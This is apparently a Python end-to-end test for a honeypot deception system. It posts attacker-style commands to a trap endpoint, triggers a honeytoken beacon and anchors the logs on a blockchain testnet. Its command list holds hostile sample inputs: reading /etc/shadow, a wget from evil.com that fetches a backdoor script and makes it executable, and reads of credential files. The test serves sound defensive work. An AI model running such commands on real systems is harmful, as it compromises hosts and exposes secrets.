"""
Chameleon End-to-End Battle Test
=================================

Simulates a full attacker lifecycle through all 3 system layers:

  Phase 1 (Inference)   → POST /trap/execute with malicious command
                          Assert BiLSTM score > 0.85
  Phase 2 (Honeytoken)  → Attacker "reads" bait file, then triggers
                          GET /api/beacon/{session_id}
                          Assert is_exfiltration_attempt → True
  Phase 3 (Blockchain)  → Bundle logs → Merkle Root → anchor on Sepolia
                          Assert on-chain transaction receipt

Prerequisites:
    1. PostgreSQL running with chameleon_db created
    2. python init_db.py  (to create tables)
    3. FastAPI server running:  uvicorn main:app --reload
    4. .env configured with SEPOLIA_RPC_URL, CONTRACT_ADDRESS, PRIVATE_KEY

Run:
    python test_system.py
"""

import asyncio
import json
import sys
import time
import logging
from datetime import datetime

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
logger = logging.getLogger("battle_test")

# ── Config ────────────────────────────────────────────────────────────────
API_BASE = "http://localhost:8000"
MALICIOUS_COMMANDS = [
    "cat /etc/shadow",
    "wget http://evil.com/backdoor.sh -O /tmp/pwn.sh && chmod +x /tmp/pwn.sh",
    "cat aws_production_keys.csv",
    "cat .env.backup",
]
BAIT_FILE_COMMAND = "cat aws_production_keys.csv"


def banner(phase: str, title: str):
    """Print a phase banner."""
    print(f"\n{'='*70}")
    print(f"  {phase}: {title}")
    print(f"{'='*70}")


async def phase1_inference():
    """
    Phase 1: ML Inference — Send malicious commands and assert BiLSTM scoring.

    Expected:
        - BiLSTM prediction_score > 0.5 (malicious)
        - For high-confidence attacks: DeepSeek LLM generates deceptive output
        - Response includes session_id for honeytoken tracking
    """
    import httpx

    banner("PHASE 1", "ML INFERENCE — BiLSTM Threat Detection")
    results = []

    async with httpx.AsyncClient(timeout=30.0) as client:
        for cmd in MALICIOUS_COMMANDS:
            print(f"\n  ⚡ Sending: '{cmd}'")

            resp = await client.post(
                f"{API_BASE}/trap/execute",
                json={"command": cmd, "ip_address": "192.168.1.100"},
            )

            if resp.status_code != 200:
                print(f"  ❌ HTTP {resp.status_code}: {resp.text}")
                continue

            data = resp.json()
            score = data.get("prediction_score", 0)
            is_mal = data.get("is_malicious", False)
            sess_id = data.get("session_id")
            response_preview = data.get("response", "")[:80]

            status = "✅" if is_mal else "⚠️"
            print(f"  {status} Score: {score:.4f} | Malicious: {is_mal} | Session: {sess_id}")
            print(f"     Response: {response_preview}...")

            results.append({
                "command": cmd,
                "score": score,
                "is_malicious": is_mal,
                "session_id": sess_id,
                "response": data.get("response", ""),
            })

    # Assertions
    print(f"\n  {'─'*50}")
    print("  PHASE 1 ASSERTIONS:")

    all_malicious = all(r["is_malicious"] for r in results)
    print(f"    All commands flagged malicious: {'✅' if all_malicious else '❌'} ({all_malicious})")

    has_session = any(r["session_id"] for r in results)
    print(f"    At least one session_id returned: {'✅' if has_session else '❌'} ({has_session})")

    # Find the bait file result
    bait_result = next((r for r in results if "aws_production_keys" in r["command"]), None)
    if bait_result:
        has_beacon = "/api/beacon/" in bait_result["response"]
        has_keys = "AKIA" in bait_result["response"]
        print(f"    Bait file contains beacon URL: {'✅' if has_beacon else '❌'}")
        print(f"    Bait file contains fake AWS keys: {'✅' if has_keys else '❌'}")

    return results


async def phase2_honeytoken(phase1_results: list):
    """
    Phase 2: Honeytoken Trigger — Simulate attacker accessing beacon URL.

    The attacker has exfiltrated the fake credentials and now "validates" them
    by accessing the beacon URL embedded in the bait file.

    Expected:
        - GET /api/beacon/{session_id} returns 200 with image/png
        - BeaconEvent logged in database
        - HoneypotLog.is_exfiltration_attempt → True
    """
    import httpx

    banner("PHASE 2", "HONEYTOKEN TRIPWIRE — Beacon Trigger")

    # Find session_id from phase 1 (the bait file interaction)
    bait_result = next(
        (r for r in phase1_results if r.get("session_id") and "aws_production_keys" in r["command"]),
        None
    )

    if not bait_result:
        # Fallback: use any session_id
        bait_result = next((r for r in phase1_results if r.get("session_id")), None)

    if not bait_result or not bait_result.get("session_id"):
        print("  ⚠️  No session_id from Phase 1 — generating a synthetic one")
        import uuid
        session_id = str(uuid.uuid4())
    else:
        session_id = bait_result["session_id"]

    beacon_url = f"{API_BASE}/api/beacon/{session_id}"
    print(f"\n  🎯 Triggering beacon: {beacon_url}")
    print(f"     Simulating attacker from: 203.0.113.42 (via proxy)")

    async with httpx.AsyncClient(timeout=15.0) as client:
        resp = await client.get(
            beacon_url,
            headers={
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 KHTML, like Gecko) Chrome/120.0.0.0",
                "X-Forwarded-For": "203.0.113.42, 10.0.0.1",
                "Accept": "text/html,application/xhtml+xml",
                "Referer": "http://evil-c2.example.com/panel",
            },
        )

    print(f"\n  {'─'*50}")
    print("  PHASE 2 ASSERTIONS:")

    # Assert response
    is_200 = resp.status_code == 200
    print(f"    HTTP 200 response: {'✅' if is_200 else '❌'} ({resp.status_code})")

    is_png = resp.headers.get("content-type", "") == "image/png"
    print(f"    Content-Type is image/png: {'✅' if is_png else '❌'} ({resp.headers.get('content-type')})")

    is_png_bytes = resp.content[:4] == b"\x89PNG"
    print(f"    Response is valid PNG: {'✅' if is_png_bytes else '❌'}")

    no_cache = "no-store" in resp.headers.get("cache-control", "")
    print(f"    No-cache headers present: {'✅' if no_cache else '❌'}")

    print(f"\n  💡 Session ID: {session_id}")
    print(f"     Check DB: SELECT * FROM beacon_events WHERE session_id = '{session_id}';")
    print(f"     Check flag: SELECT is_exfiltration_attempt FROM honeypot_logs")
    print(f"                 WHERE log_metadata->>'honeytoken_session_id' = '{session_id}';")

    return session_id


async def phase3_blockchain(session_id: str, phase1_results: list):
    """
    Phase 3: Blockchain Anchoring — Merkle root → Sepolia testnet.

    Bundles all attack logs into a Merkle tree, computes the root hash,
    and anchors it on-chain via ChameleonLedger.storeMerkleRoot().

    Expected:
        - Merkle root computed from attack logs
        - Transaction submitted to Sepolia
        - Receipt with status=1 (success)
        - Etherscan URL returned
    """
    banner("PHASE 3", "BLOCKCHAIN ANCHORING — Sepolia Merkle Root")

    from integrity import MerkleLogger
    from blockchain_sync import anchor_latest_root, get_root_count, get_latest_root

    # ── Step 1: Build Merkle tree from attack logs ──────────────────────
    print("\n  📦 Building Merkle tree from attack logs...")
    merkle_logger = MerkleLogger()

    log_entries = []
    for r in phase1_results:
        entry = {
            "attacker_ip": "192.168.1.100",
            "command_entered": r["command"],
            "response_sent": r["response"][:200],
            "prediction_score": r["score"],
            "session_id": session_id,
            "timestamp": datetime.utcnow().isoformat(),
        }
        log_entries.append(entry)

    # Add beacon trigger event
    log_entries.append({
        "event_type": "beacon_trigger",
        "session_id": session_id,
        "source_ip": "203.0.113.42",
        "user_agent": "Mozilla/5.0",
        "triggered_at": datetime.utcnow().isoformat(),
    })

    merkle_logger.add_logs(log_entries)
    merkle_root = merkle_logger.build_tree()

    if not merkle_root:
        print("  ❌ Failed to compute Merkle root — no logs")
        return

    print(f"  ✅ Merkle Root: {merkle_root}")
    print(f"     Log entries: {len(log_entries)}")

    # ── Step 2: Get pre-anchor root count ───────────────────────────────
    print("\n  ⛓️  Checking current on-chain state...")
    try:
        pre_count = await get_root_count()
        print(f"     Roots on-chain before anchoring: {pre_count}")
    except Exception as e:
        print(f"  ⚠️  Could not read root count (contract may be new): {e}")
        pre_count = 0

    # ── Step 3: Anchor to Sepolia ───────────────────────────────────────
    print(f"\n  🚀 Anchoring Merkle root to Sepolia testnet...")
    print(f"     Root: {merkle_root[:32]}...")

    try:
        result = await anchor_latest_root(merkle_root)
    except ValueError as e:
        print(f"\n  ⚠️  {e}")
        print("     → Add your MetaMask private key to .env: PRIVATE_KEY=0x...")
        return
    except Exception as e:
        print(f"\n  ❌ Blockchain transaction failed: {e}")
        return

    print(f"\n  {'─'*50}")
    print("  PHASE 3 RESULTS:")

    tx_hash = result.get("tx_hash", "N/A")
    status = result.get("status", "unknown")
    block = result.get("block_number", "N/A")
    gas = result.get("gas_used", "N/A")
    etherscan = result.get("etherscan_url", "N/A")

    is_success = status == "success"
    print(f"    Transaction status: {'✅' if is_success else '❌'} ({status})")
    print(f"    TX Hash:  {tx_hash}")
    print(f"    Block:    #{block}")
    print(f"    Gas Used: {gas}")
    print(f"    Etherscan: {etherscan}")

    # ── Step 4: Verify on-chain ─────────────────────────────────────────
    if is_success:
        print("\n  🔍 Verifying on-chain...")
        try:
            post_count = await get_root_count()
            latest = await get_latest_root()
            print(f"     Roots on-chain after: {post_count}")
            print(f"     Latest root matches: {'✅' if latest == merkle_root else '❌'}")
        except Exception as e:
            print(f"  ⚠️  Verification read failed: {e}")


async def main():
    """Run all three battle test phases."""
    print()
    print("╔══════════════════════════════════════════════════════════════════╗")
    print("║     CHAMELEON ADAPTIVE DECEPTION SYSTEM — BATTLE TEST          ║")
    print("║     End-to-End: Inference → Honeytoken → Blockchain            ║")
    print("╚══════════════════════════════════════════════════════════════════╝")

    start = time.time()

    # Phase 1: ML Inference
    try:
        phase1_results = await phase1_inference()
    except Exception as e:
        logger.error("Phase 1 failed: %s", e)
        print(f"\n  ❌ Phase 1 FAILED: {e}")
        print("     Is the server running?  uvicorn main:app --reload")
        sys.exit(1)

    # Phase 2: Honeytoken Trigger
    try:
        session_id = await phase2_honeytoken(phase1_results)
    except Exception as e:
        logger.error("Phase 2 failed: %s", e)
        print(f"\n  ❌ Phase 2 FAILED: {e}")
        session_id = "fallback-session-id"

    # Phase 3: Blockchain Anchoring
    try:
        await phase3_blockchain(session_id, phase1_results)
    except Exception as e:
        logger.error("Phase 3 failed: %s", e)
        print(f"\n  ❌ Phase 3 FAILED: {e}")
        print("     Check .env: PRIVATE_KEY, SEPOLIA_RPC_URL, CONTRACT_ADDRESS")

    elapsed = time.time() - start

    print(f"\n{'='*70}")
    print(f"  ⏱️  Battle test completed in {elapsed:.1f}s")
    print(f"{'='*70}\n")


if __name__ == "__main__":
    asyncio.run(main())
